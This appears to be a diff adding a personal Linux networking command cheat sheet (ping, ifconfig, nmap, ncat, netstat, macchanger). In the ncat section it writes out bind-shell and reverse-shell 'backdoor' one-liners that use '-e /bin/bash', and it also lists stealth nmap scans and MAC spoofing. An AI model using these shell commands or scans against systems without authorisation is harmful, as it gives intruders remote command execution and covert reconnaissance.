@@ -1,0 +1,106 @@
+
+****ping ****
+
+ping -c 4 www.google.com (ping google 4 times)
+ping -w 4 www.google.com (ping google for 4 seconds)
+
+****traceroute****
+
+traceroute www.google.com 
+
+****ifconfig****
+
+ifconfig / ifconfig -a (display all interfaces' configurations)
+ifconfig wlp6s0 (specify a particular interface) 
+ifconfig eth0 up (activate interface eth0) 
+ifconfig eth0 down (deactivate interface eth0)
+ifconfig eth1 78.45.234.23 (give static ip address to an interface) 
+ifconfig eth1 netmask 255.255.255.0 (gives interface eth1 the netmask of 255.255.255.0)
+ifconfig eth1 broadcast 78.45.234.34 (gives interface eth1 the broadcast address ) 
+ifconfig eth1 78.45.234.23 netmask 255.255.255.0 broadcast 78.45.234.34 (combining all into one) 
+ifconfig eth1 0.0.0.0 (reverts back) 
+
+
+ip addr /ip a (similar output to ifconfig)
+ip r (ip address of the default gateway / router) 
+ip link (shows the interfaces) 
+ 
+****dhclient ****
+
+dhclient eth0 
+
+***nmap****
+
+nmap 192.116.1.1
+nmap 192.168.1.1-255 
+nmap 192.168.1.0/24 
+
+nmap -oG - 192.168.2.0-255 -vv (greppable output)
+nmap -oX - 192.168.0.0-255 -vv (XML output)
+nmap -oG - 192.168.2.0-255 -vv >> saved_data (redirecting output to a file)
+
+nmap -sn 192.168.1.1(disable port scan) 
+nmap -A 192.168.1.1 (agressive scan)
+nmap -sV 192.168.1.1 (scan versions) 
+nmap -F 192.168.1.1 (FAST - scans for 100 ports)
+nmap --open 192.168.1.1 
+
+nmap -sT -p 80.22 192.168.1.1 (scan ,TCP, ports 80 and 22) 
+nmap -sS 192.168.0.0/24 (stealth scan)
+
+nmap -O 192.168.2.1 (scans the os of 192.168.2.1)
+
+****netcat/nc/ncat****
+ncat -v www.facebook.com 80 (connect to google.com on port 80 and get index.html)
+GET index.html HTTP/1.1
+
+ncat -v -l 2222 (create a socket server to listen in port 2222)
+
+*Transferring a file using ncat 
+cat a.txt| ncat -v -l -p 2222 (on server)
+ncat -v localhost 2222 >> a_copy.txt (on receiver) 
+
+ncat -v -ul 7000 ( -u for udp connections )
+ncat -v -u localhost 7000 
+
+*port scanning using nc
+nc -v -n -z -w 1 192.168.1.2 80-100 (but omitted from nmap's version i.e. ncat) 
+
+*remote shell 
+ncat -v -l -p 2222 -e /bin/bash (on the remote machine) 
+
+ncat -v localhost 2222 ( on the local machine) 
+
+*reverse shell (backdoor) 
+ncat -v -l -p 2222 (create a listening socket server in local machine / hacker's machine) 
+
+ncat localhost 2222 -e /bin/bash (this is in the targetted machine/ remote machine) 
+
+
+****netstat****
+
+netstat -r (display routing table ) 
+netstat -i (interface)
+netstat -c (continuous listing)
+netstat -a (all ,display all sockets) 
+netstat -at (t for TCP) 
+netstat -au (u for UDP) 
+netstat -lt (listening TCP) 
+netstat -lu (listening UDP) 
+#Add -n to display numbers instead of names 
+netstat -lnu 
+#-p to display programs / program ids 
+netstat -nlp 
+netstat -nlp | grep :22 (grepping for information of port 22) 
+
+****macchanger****
+
+macchanger -r eth0 (assigns a random MAC address to interface wlp6s0)
+macchanger --mac=XX:XX:XX:XX:XX:XX eth0 (assign a custom MAC address) 
+macchanger -p eth0 (reverts back to the original MAC address) 
+
+
+curl ifconfig.me :gives your your public ip 
+
+
+cat cheatsheet | curl -F 'f:1=<-' ix.io
